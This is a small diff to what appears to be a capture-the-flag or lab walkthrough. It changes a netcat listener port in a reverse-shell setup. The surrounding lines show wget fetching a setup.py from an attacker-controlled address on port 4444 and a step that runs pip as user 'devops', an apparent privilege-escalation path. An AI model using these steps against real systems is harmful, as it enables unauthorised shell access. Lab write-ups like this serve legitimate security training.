@@ -196,7 +196,7 @@ From the vm, wget -cv http://192.168.0.111:4444/setup.py
 
 Start netcat:
 
-    $ nc -lvp 443
+    $ nc -lvp 3333
 
 With ou user `devops`, launch pip:
 
